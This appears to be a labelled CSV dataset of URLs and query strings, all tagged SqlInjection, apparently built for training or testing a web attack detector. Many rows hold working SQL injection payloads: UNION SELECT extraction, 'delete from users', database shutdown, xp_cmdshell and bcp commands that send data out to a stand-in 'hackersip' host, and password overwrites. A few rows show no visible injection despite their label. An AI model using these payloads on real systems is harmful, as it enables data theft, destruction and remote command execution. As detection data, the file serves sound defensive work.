id,class,vector
97,SqlInjection,/aUcmeeonih/gte9dcnhnls/ns4/zN/NPStviB@xp_YO3HC/oooric/eJMNn/C4HYTlocation/3lctn/arCttehuTblwoatari/BSl.php?6eqTEiTsos5uSo=6901&allACGLJxp_=-Iv5+0sAoeq13opo&rse3wadaXhiet4=dlslwifonphoi9&ssissffhtqgrei=fchildsystem%24t+&ojtuuonei=peixcltwhree&i3HHa2childoL=%3Eilm&emdphentdv=l4ZpZYCR2&ia29eeowotg8Iea=19&tYe8irddrniaper=%27+or+id++++in++++%28+++select+++++*++++from++++++user_db++++%29&qH=10&xbP7f=189399&TGLVhomezcq=Gehe%3F%3D
99,SqlInjection,/tQF41EDRwanQ./seG@@PHOL-Byr3CE7/t6/sT.Ial/aiSliytc.nsf?jOAiO=leHxrdecta+&lrsmaiosxpi=fq&uHBbRS6Z43=93&SbLa6zlfmosctes=nCv&ue=dhhat&5hn=eNNQARwyKQ7w&_xV2LLik=%27%3B+++begin++++declare+++%40ret++++varchar%288000%29++set++++%40ret%3D%27%3A%27+select+++%40ret%3D%40ret%2B%27+++%27%2BSl6nnhi%2B%27%2F%27%2Bpassword+++++from+fna+++where+892hin%3E%40ret+++++select+++%40ret+++++as++ret++into++++foo+++++end--
109,SqlInjection,/fxHbt6cVMblSJJ/aaeinhaioakAan/i0/rTln/oeoceo/sRUrV3fAX1-zFN/rrlcaex2Sfi8nbl/hSTpfFo4Kee4MJHIai/osXIincludej/a3.shtml?whl0jrzsez=494624&MLLsystemqkQx=lKe&Sta9oguneern0a=mu&lewshe0r=xIt8nnnek5hwt4nla&a6Eeoi1elsmt=eh%3B&0@1FdI=3s9myqae4Iirtiemlb&fSod=ewinnteh+o%24fi2untmu-&ud=no3form9acd+baacceptEa&shoofroO=lrperlso&_dTKUX=6193&lyh=9aelw1s
115,SqlInjection,/87CANt0processing-instruction7MP5C/r47fut/nttcQesit.css?ed=%27%3B+shutdown--&raysmdE=HuahluLbpd6X&kpn4Tnoadro=rrdCQpww.Z&httpsjXQcmdX=dRReCgk7&7L8NGOd8=itin%29aeIesj&leAnliLmaetk=t%3Bv&ezeseNosa=t%7E%5CeooerRt%3B%5De0aE%3Dna&35i0iee=e
117,SqlInjection,/t7h37eVhlsRP/tLivhTrnpohoGaa/adeo1ov2eAthn/gCs3/floo.js?lalqne=OR++%27i61Ie%27+++++IN+++%28+%27+%27++++%29
120,SqlInjection,/2@l.aZLU3FOzy8Ju/hT7IPT@vlikeqobject/17so/NIYeuinclude/rsoEags/ua/reorSXxgYRL/v4tDnurop3Somnh0s/wtthm810tbhsrCisrne.cgi?78S8wKC4x0=arodyoeWzne&Tr=uymeraejuelcSo&edsaohztt0ells=5stoua&o2DhzrtlRm=oinweolatmncaieh&nEM_=ok%40OJbiM&d0t=%3FaaiytrSihme&9f3qD8u=chditmp&mat=%3B+insert+++++into++OPENROWSET%28++++%27SQLoledb%27%2C%27uid%3Dpi%3Bpwd%3Dmts3n%3BNetwork%3DDBMSSOCN%3BAddress%3D126.85.192.9%2C1433%3B%27%2C%27select++*++++from++++_sysdatabases%27%29%3B+select++*++from+++LinkedOrRemoteSrv1.master.dbo.sysdatabases&heD=raoekia&ckam=mleSYfnt+&mal=pHoost&FAovR.yuO5u=nheou&nph-group
125,SqlInjection,/lJQV6Lr-73bXQwp8JY/uQF2RwEf34/KrmLXARIxv6U./niG/c.4p2/HYsnlpfeo04s.php3?uheTiki4lo=nTkeuh7o4&IUDn=85&ivhu5neFitbee=%27++%2F**%2F+OR++++%2F**%2F++%27He%27+++++%3E+++%27S
133,SqlInjection,/opsmetanOpsE3/h0t7y-pyD/depawejcduQs/qPQ7t4l/weuhi5oLWeOcO4Txuu/Vzu0pVx/xZHf./-ZcQYevali29EGlog.32/vbscriptN_Kb/1bin.qgy-T.aspx?osrne=wchild&anoe0EZiafkibi=096112526&otOels=bulk+insert++uittmfsOo++from+++%27pwdump.exe%27+++++++with+%28codepage%3D%27RAW%27++++%29
139,SqlInjection,/e._.LqjLcxM/Ih/l6cOq_D1y.xJVUE9F7/tilaZGo4gGzOtu2cLr/U.pSMGwL7MAnullB.sh?httpa7y9=iinclude&wiebln=85958570&3Go_vNinIE=33telt3anxeotttai5&JrsqudlIoe=7228879&bgsoundlN8childCrh.passthruQ-=cedt&rssl3nietoDwr=Ienrruwn&otlOebr=+
154,SqlInjection,/TW_qUTj5-z28DvG/7eb/tw--833820aTI/eO0hSesfTdloscnz3/f0tqMstimeDAamLi/oWhttpsRpbtI7gt_xcwp-/oulnGxOTIO/iDu/SH-3E1U9.exe?uRhmLsedel6=vwn%27ha8n&iuSe7=gtm&0vwindow.open9o=46828854&yIX-gbtK5w=y+e&esnenOtrie5f=ituf&ctoxsRgpgrane=eoewp-i&nph-xbgsound6pzphpLRsam=son+R&nLu7n=e7hs&niesds9bm=79189567&q2b6fSI6r=41340&igAiFMMKuWqj=734340&ectiiedeO=aee6t&oeixtdqltrq=%27++++%29%3B+++++delete+from+users%3B+commit%3B++++dummy%28++%27&obtemIr9Tn=asq
163,SqlInjection,/jnelib6Wa.i4/exbl/erEteu6o.tiff?EFXldA4JbNX=twleevalgochild&OstRati=m6yufccmi&chlob0NOwitipo=EsraeiOgad
173,SqlInjection,/eyoatnntt/TUa/lhreufbrdip.js?SQS-z3rzqaccess_logPC=%28l%2Fm+srwhereQtw&dt=38&0VKwp-8divOX0=%3Axipi&Eg3QueI@g_kor=7twue&y7rhheaq=rGUR&ss4=%27++OR+%2799he%27++%3C++++%27X&imte=erObbtvugu-M&s7nhe4i=srwnca%3Fo%26hsrEsm&nEgsos5baqu2iIh=4653205&Ptz0osennTfa=aBiUJG3&vsthj7=da%3Cszslib%5Dh
177,SqlInjection,/l7rcYhf010hK0WSfeYd/hoEqB-Az/GYks4HgC_ENpjEP/eoeLufvaacwit/7yBOzPE/mailN.htm?NOL2m=OR+++++%27msesknfdpl%27+++++%3D+++++%27+++++%27&4bdfh=cae
183,SqlInjection,/t_FKvb/tqI8efr1hCSlv/501WfT-h6z3JGWXT-F/lmEa/AE/8XM5rmDck/rkvG0c/nciknxeIvvhfN/n2tmAkExQedG/wxRV7/39hnJuRKLm.tiff?enoiy5Scofuws=w%400KIV&rtI6lSnnhiae=omoR&oyosFjmpt=exec+++xp_regwrite+++%27HKEY_LOCAL_MACHINE%27%2C%27SOFTWARE%5CMicrosoft%5CMSSQLServer%5CClient%5CConnectTo%27%2C%27atlrm%27%2C%27REG_SZ%27%2C%27DBMSSOCN%2Chackersip%2C80%27&wRowrn3kensdeea=from%3Azeq&vndssr=Al4wialcur&yvbscriptTpasswd6M=ymBrle%2Bocoe6ta&nhsbcrveorzn=3833&cArr2wp3oi=854&LTi=31247194&i1lThnit=ncheititlizaxHEwhe&te=064162&e5nyttedsriis8j=a%25lI&tOhuRpfo=76&R7Fterttv76a2=ifw&snord=est
186,SqlInjection,/sc8U-/ezf6mGkId1Yu/eoraucjtsoe6Atxprt/naen44tlTuetc2ir/esmfRgC@d5ZjEnIA/geSyqaMooocqtomfe/nwaAmzgraXhemnta0/0tKUYdA2L2pj96/watuoxzsEiht/6ys1spt9e/ysTBmj9KfvGkZF/lln.jsp?aqquicdttoifr=exec+++++xp_cmdshell+++%27bcp++%22select++*++from+++++fh%22++queryout++pwdump.exe+++++-c++-Craw+-Shackersip+++++-Usa+++++-Ph8ck3r%27&a24UIN=%24j%5B%29or%7EW%3F&lnss=anrfnridIatadb6&silsi3SslTttr=954832&mtp5etio=elbn89&vscript3minputT=6595865094
187,SqlInjection,erthhle4eAtis=597985227&ofm8piE9cr=5qj&sTafnr0Suc=98181453&rweidmeaxfste=been&ae4e=OR  'dP5tacm'    BETWEEN 'R'    AND   'T'
188,SqlInjection,/re8opuramdbel/d1A3.shtml?netegnN4dten=oteOwrzoelrsiT&4sWW=561&dlM4qsenotL=on5rinaaseieemoit&dboa1=85&etadwrdEh=teeeeGexr0eniprt&czcgieLixXTrd8e=eehos&SAw=bP25Y3&f7ZobjectrmbetweencSW=00133&QDabemodei=lFlw&ohric=gGsteeedbgo&e2ycrtC5=%27++%2B+++%28+SELECT++TOP+1+++Lnnoro0e+FROM++foRealTf%29+++%2B+%27
191,SqlInjection,/dhojw05pIp@JoxT/Etkazeefs/adr6tbhn91oeDFisims1/nsxnTta9e4osieAnss8.html?
193,SqlInjection,/wLh/aeayc6anwpyfauie2x/iXKsZzIi.mspx?ieebho=mb&k.RKaFkhomeDDO=1echobilttim%2B57%2Bhttpsei&8tiigtdarwu8ede=OR++%27cdrg%27++IN+%28++++%27++++%27++++%29
199,SqlInjection,eR=oh8mmxpzA&smih7ta=0154412&a0itin3TiUrrh=8440417958&f0t=vs&v9tedqftsnsqej=92&dEs=59&aB=aR7&Rs4EH=glocationwuRercp :las
202,SqlInjection,hxaqsm=d(m5htpass>x&ococrnemdt=s0a&taoAs=avtnodeb|eI&ry1imb4eesot=atoOisdeatez  c&7itkae2tEkT=17043835&ehe7=527166&kB5HeTmeeehe=87072475&lutthsnswtee=oi&LF9Ah2HjDQn=35&baA20Nhn=?&i;&S9ie0i=91795&powuveti=h
207,SqlInjection,/nHc1GSDoxvO9r_./rtaa0eaam/dirun/eic.htm?M.a58F=+bH&s6am0tas=%2F2fo+0%3C+lne+t+%2Feg%7C&rzlhc0=77464&vxPEy=os%40%2F&nbemuzrrsiienap=550&Y4harto=67%5CtxtermvPr1&tcesS7camon=09717&dSU@R3r9u=N&fdiz8ijubD=3&dGMmtafo=tr&mfmboime1eem=cwnXf&WwPVlinklog=%27select++++customer_phone++%27%7C%7C%27from+customers+++++%27%7C%7C%27where+++customer_surname%3D%27%27%27%7C%7C+++lv_surname%7C%7C%27%27%27+and+++customer_type%3D1%27%3B&NSfxFqjn-xp_Z8=1&rt4ijtQuN=zyemb&N0at56v=96
209,SqlInjection,/r_QvN7YqvHEmtjs8FcZ/aaipirnret7hQkofe/Tisapiihsho/emlxesbpsoesbobtdll/i_rnBwfaXSbo0Hn/7MFimvzehHc6xitana/catDOhtaccesq6dropW/oteerevn9iewArtwdIl/waffNi/0arHM6TNARUO18i/L4_8pR-/lswear7.js?7bsh0dde4O=ysewothss7tntotn&4b=46&lpecaoeaaehi=tULs13EWtB&etoruseoe=uV3Y8JcEQ-l&J2OSK=nseasns1ka&1SlTSolilta8rS4=iehteB&e2e2tglqbyel6hV=ioseR&yXlN5u=arrtit&Zfco70=uexecashutdownp&leepneTd=i%3D+r&dEn4ilmmisui=hl%2Fdsam&bservicesZSDGL=hLwEem&aceY7=exec+++++xp_cmdshell+++%27%22hhim%22++++%3E%3E+script.vbs%27
211,SqlInjection,uIrimlBrthr=pE.X&sqG=ee5sadn;zf:&saradtosb=dosnwync&cm8der=ep&22go=dd IteaneC$5&rlfplnlcam5=Ph\@l/[2erstio&ilba=nb7ar5&nxlx=r1w&KXHP=po9hOiysutr&Ncr7oheihkhMe=629801069&eo=~fhrlnbgtskryhA
230,SqlInjection,/bq9tmtg0cbtkchnpn/ttaaahen5tbet/C./4Remieeisfsouaforae/rI-52/sKy1x-M-/tvNAyu4iwi/1IA79a5g/tRKbEZ/POk/dgV_OOhm/ba.cgi?aa=5631&Rshutdownlsudivkdlx7=sk&97pahohn6ze=8roqln&5rtSoSoh=%3Bc&weAjefmWpoEqj=ait%3A&C@_6=s%7Et%3B&nnn=amimnrv7yeh41&Tn9Nv4hn=ni&crhdw8Isdcadeas=a&oia=83087629&olI4resoo=et74mgqyisnh&et2=etitm&trer6hyx=zenu&wbgsound1af0uO4v9wget=6857141&toae=niabaodrc
235,SqlInjection,/o0S5av4x5aYI.I.I7/dteteF2t9e4esnfETo6h/ntrmac0oHgltg/ezH/7.T@fconnect%u7mjechowNwT/C6J0xp_MvUaKP.jpeg?tngasardgo=phpa&wYHh=%27%29+++UN%2F**%2FION+++++ALL+++SEL%2F**%2FECT+++++%27ehntoen%27%2C76%2C392%2C%27aeeoneAae%27%2C9+FROM+osxe7ar+++++WHERE+++++%28+++%27%27++%3D%27&304essscfgh=gibAt0l8b&OFWRv.K=aHtyfwPvaT9k&pm2z=4950&TpsantaS=torlsam5uber%7Clfromrr%3Csa&1oihEeqtsOeb0=2&ktli=rpi4eoouemo
240,SqlInjection,/formZpDflikeN7/s0vbnisptxmL/ehhn.bin?fjld=78&EipdaZeiuy=lruiutd2orcloek&8mldwreji=pb&odsjoo=+OR+++++2++%3E++++1&lshutdownautoexec_UMElni@=assJatts&teo=4467707
241,SqlInjection,/t_/na099p0.avK/owuEwInK@ZQcZAclDZd/oq3sntleec/dc60.sh?lsrH7oeT=221842619&HAjTperlu=%27+++%29+UNION+++ALL++SELECT++sc3auW++++FROM+Yy35++++WHERE+%28+%27%27++%3D++%27&te=neaefV
245,SqlInjection,/eod/D7Emocha@o-.sJ.W/all5positionQ99@S9beSEZ/he.mdb?Ygroup
248,SqlInjection,/tit-qmv9tdn/EA/oramtn/gIXD2.mdb?
271,SqlInjection,nqracarct9=o&dljinfit=wheret&fdOLnTi8oee3e5d=0455573&o41rZt=2eonnr&cnSyoxu=5uoouje&nrcw=t uim&tperrl4Arftm3eh=855372532&soanifnheX=efatelnfmriNmi&Ohe6kinds3iw=yNoFZt8bPSH&ntlaua=laKQqiUQ-i&jm=nTaoli2ojiat&twtsey4ssulit=zseA3deleteMe&oeBs=logxmlwsOhot6t;gNomdr+t
274,SqlInjection,eegn=';EXECmaster.dbo.xp_cmdshell'cmd.exe&hle=6197660&oozseis7fh=463906&h1ielb4ies6i=373&iZCMNifMOZ=]eahrusrm&VSOMi5J=]AeT&cEmN0tnneorou=5728907549&adnjel2lctp=85&Oeei=kuss
278,SqlInjection,/gREyo/6g@zy79U1nd/lssTvl2Air3V/QvA1NK.pl?2kzg8K=ui%3FnlRn2hiOxeeR&tehnmnto=152116111&AEhtDn=%5Bl1s&miaiete=%27+++OR+++++%27aedfi98otb2%27+++LIKE++%27aze%2525&M5i=sstdinv&Z6P7bgsoundTmHdelete=e30Rb&nLea=ttN
288,SqlInjection,/quV27FFRTnode/bieay7/uMrJK@/toArarvhhlYjrgowct0/fxIi/QVhkRf4FZk/wer7/ea6/tKgj8uoEE_DU/SMT/n-kmszqkOM.lcWq7.asp?09sotbyweFtod=u%24t&hCo3dD1AoCL=OR++++%27syoob22N%27+++++BETWEEN+++++%27R%27++++AND++++%27T%27&nzxYQus=543&4Jysam7AMF-RTN=elaao7nmh&ogD@NlshaGkL=524&3kPO1PTQhG9=n&sSzfmaweo=hElaoe5t&IgnelArt3xw5sd=eoOyzQ-w&qrisxaetvhdne=senhOkeansoeeU
289,SqlInjection,/aaftH/6tro/nxohtaccesdsdallFYjY.sh?hyde7u=%27+%2F**%2F++OR+++%2F**%2F%27%27++%3D%27&hi=%7CluT5Ireplace2lor2&EfiXocnfxq=eoyssxFe1es&admintOgxahaving=dr+bgsoundi&Rr6=rChEq
290,SqlInjection,c9c_10shutdownKF=al2sc1telOwo8
293,SqlInjection,/ei1iunawPys/treud0pte.cgi?ri=25292358&zrbis=55&htws=ro&n2servicesmRBj_G5=0ssiLYi&ovf3CS-F=0&upo0upobmncYMha=hirroEs6nlocationd%27&nsiod2=ne+mTd%3Fcne-Et&apA@inDp7oH7=sep0s9l4tvsbata&yn.4X1utL=eigidwaw%25uicrirscript&9gsdne=05&QSLinsertGvF-V4=exec+xp_cmdshell+%27bcp+++++%22select+*+++from++aeE0snte%22++++queryout++pwdump.exe++++-c++++-Craw++++-Shackersip+++++-Usa+++++-Ph8ck3r%27&oteheDEfilurnr=11116&iul6ifiks=sqa
299,SqlInjection,/eEOP5Sx.Y/cm/tp/pK9Z1pmLQQ-a/iuWe9m7zPM3Bo/lBpY2k/pmcTw7OWm565.bin?J_DtO@wI4nW=a2c&766Z6tO=89076&2vbye1=sh%25laIj8de&SasLy.I1Qi=4092907&p9T=upsov&amTeOsiby=ottntNeef3elhwn&i5utfmre=eY&op1t3hmAgij54il=508377616&srspebGdlef7o=%27+++%2F**%2F++OR+%2F**%2F++++%27aocn5ao%27+++%3E+++++%27S&l6lvardivcbmraCiframe=38666023&AptxAEheernt=hKC8&41ogt27el=yVYwGDTcWQ&GorEOlhsA=8938072&ehedscaThf9oie=nLR%28oocyd&Tninb0oopd=eDVO0fzD0Oy
307,SqlInjection,ioeolti12=cdn+\&rhrt05ePu5i=boRTI&iecTeoS=o<aoa&I1='   OR '1e0wtLea'   LIKE     'aze%25&pkolh=ncsity4dsziihojziE&nEdndcmn5h=902&ezrnyBoitelno=pisna&dHraoo=70564869&TpmpttL=hh&&WkIgZ.5wALrE=3&Ehrxtn=8088&xxinlibphpSkmm=nl0iframes&crNeADeR8Stt=iu%etnnut5ubh&olw49gltalatl=53097813
312,SqlInjection,/d.OqS_D/isnIureeea7lotwisEhc/a3MNo9lt8L2M15sP/iv.2.php?jero=06231&nWaeceqtou=sX1&rathoihsSeohe=ieoddf&0QIX=02&rKDiinn=iboot.inih+&nan=ede6-lqo%7Ea
316,SqlInjection,/tb6s2j8P/TinefnweTsheioh2/ykuXJeEXi@WM/@EN036_MinputOiframesa/ignTtfarHq97ip/.kreplaceGm2A.asp?9ht4ewcbn=-&osidshsiih5ul=%27union+select++++PASSWORD+++from++++DBA_PASSWORD%3B--&mnunpseEno=dsbeechojl%5Cc&emt=axGx&uheista2zi=ivZyT&iu=aD-8IQxu.fl&187Tunion=3562&ddd1f=38093&U@50UE36=npdghducE&NpN_insertBjiy=Uei7%5Dgisr8y%3Arlr&exec0kQ=eoEc%7Cbinepuperlje%27
317,SqlInjection,/eaeltuIge/wbdrhe/ogswe/YWYFPspcb/aninfD/80wxmlEYvgH_Zgkphp/Ycmd4MPsx_r/h3e8eYti/shWGax2IekpQpUneiz/RnFzudiaTtzh.bin?onUone6iuhS=35&eaiIul7oteEm=elttt+a%5Biqi%5C+i&e5kemlmeqtinlsn=x%3Ea&occndritetZSE2=gntteis8hxnt&fmhkI=9lntSanh+update6MoErlrna&qEr=ete7t7a0&wi=ercpeD&ehreu6ianurth=tqzODZTjKANz&5sbshEgnen=fH%40&Wm5Y38openS3=n9lehrgtNrmeeo&8nn8ne=hE6hlb_&rwknToii=tersa+nb&MYhlwlsFt4where8p=e_%40_mAnSwa8X&s21=n%2F+iNaslmtvn&eneheadeEj=osoeAsis
323,SqlInjection,/z46Zn0Bd_f./t.Ok3R5m1W0KCAduj/e6w4t/nPn/uPX7zdD_Axke-Y8OVgY/lk0X1uzS/m1/e_qwFeWMTFXX8aOsp@/sxihgTgIKs2OS0/as.jpeg?ydtt6nmUe=815410&seeTrazdsemr=%27+or++id++in+%28+++select++++*+++++from++++user_db++%29
351,SqlInjection,esgd=;alter    table     anas     set   password =  'hea' where    name =    'Icd0';&8er=on8ohbn4rbsMr&ha4dytnHefel=\a aruEteaoyjn&opus=imgR%t/afnautoexec 4&ddi=eUgD9pNPlN@&mnlmh8izehgyOA0=9&i4me6hvdi=c0y7mTE&doszoi5ao=to~j&$+tbl&noi2=ara
357,SqlInjection,/iyeeure/iHry1systema9KA2U4l/3QK8perlJj.html?GgpositionPgT_1jy0dE=%27%29+UNION+ALL+SELECT+6416+FROM++++ijhIadL++++WHERE+%28%27%27+%3D++%27&tl=cgt_cK7&.PAYtreplacebodyhQs=%3Ajlrsamiw%5B&esibe=leOhylcpagsr0mie6+a&sh7tsftHeDyag=iR&sw2gomyS26mm5=aoBKO&deolmiece=wtpFyetwddabr8
358,SqlInjection,/cp/nq1/autoexecKjWz7DKHJ4shutdownID/Fnd/SJ-.YbgsoundM/cs7qNP/by-SQiEoK66V4Cu.gif?F6OA9Nthttps3=5n_i9kl&sisdglye0=7867820&ktK8mwgetRxO=cKm&hn6lieformnsIt=tt-Dht6ak&etJseh0hhdugsut=rewoacechotd&Tst=4&ele=OR++%27faaaNlrh%27++++LIKE+++++%27Sim%25%27&uy7aot=fiy%40
360,SqlInjection,/_b.3h4wEi6o-1L/n38dedcyr2zstflpe/smKP.5.png?mur=ag&Bafnehp5=3doai&eeobty=Hmeds&tzincs6=%3Balter++table+ontage+set+++++password++++%3D++++%27otshg%27+where+++name+++++%3D+++%27tsshen%27%3B&n2l8=49733987
367,SqlInjection,/@SOBB8WWL/mqSeAEU76g4nLQkcqs1/jtay4uu4osrar53hha/s0aEddus/tD9fsZxA2.N.K_Z2/pO1q0ezqoKkL-7g8a/nnAesrrDtinn1pa/dOsAntopiD7abtEsh/lHxoElmyjcmQmnohrv/UlibcITbody/cac.tiff?gg2en7hne1a6=etgt&odebrrreniSAsn=gobjectcorVo4e8&ry=6&fa4nagaemooE=mnhsr&seeayDRar7F9dy=956&nopilrRtrusasf=27o4%3AtdwlYe-%7Ca&kneatstnC2g=wHsu03&tro=ajscmoe9m8ea&-EC6c05HcH=usta&@UzYxV7Q-p=eo%252G&ouaoeeiiahasnt=77&ertnsoas=5&tignife=geM0tnlAetdio&tiefeaRsRo=apxSvAL%407WZj
370,SqlInjection,/4etN@Inaz/szaULoYvxGiB2/o.B9vjc/HjimgzCmocha-vinserttXU/ridu3/ztSihadnY/jittOu9omaltddhOhar/86tg2Yh2SBK28u/9mIa/jhhslkcoantcrtp/er31l5ds/oi6kzs.css?Ie7SloVoll1j=%27+++++OR++++%27erev%27++%3C++%27X&NGo0hm-0=czhUd0EifdzSopvOm&slxtermbla=69894&GetierLil=6188950&EfLM=msaate&mmdbarin4=8836957&soA=ymkseawa&tnLmmEg=020&rtTe7=546824627&o0ae=28552727&idtlodwszEPn=hOk%40Zr5M&ingWVa25VUo.d=899888438
374,SqlInjection,/txyiwmbiaatse97dm/uJI0a7kalxJKz/aVc4XAUdroFXafEk/gvza1Uect/saeMSauojL1R0ll3siw/etoiarnrcreAi10d/iUb2ue4R3dOba_L4l/eh/xqiywI.ncJzNLeHD.jpg?IogZFpassthruPF_=t%25iIa%3FTOoeehpom8&4ataineUnhyu=9576890&ateqLsehoNeufu8=609253&bDRD1vWchild=tAr7r&MeihKJA=nswcs%27++++%29%3B++DELETE+++++FROM+users+++++WHERE+upper%28username%29+++++%3D+++++upper%28%27admin&7xxzcopyetcVu2=iv+i&sy1Zeal=782698541&lhrh=%7Cxml5ed%3Brrusystemehttps%7E%29nk&icbhdmnbsh0=olndi&4E9a4bk=i8Z&oinvbjmc=876866&eEspitcpbs=140852263
381,SqlInjection,/oliht/6thLtpiYdt6nwantoS/i8DrO6vioeUlqvgCr9xH/hsJg8Dg/ocqtauhltaS5e.jpg?zXUWwindow.openjlbetweensaq=%27+++++union++++select+++sum%28re%29++from++ous--&oeerse=712991
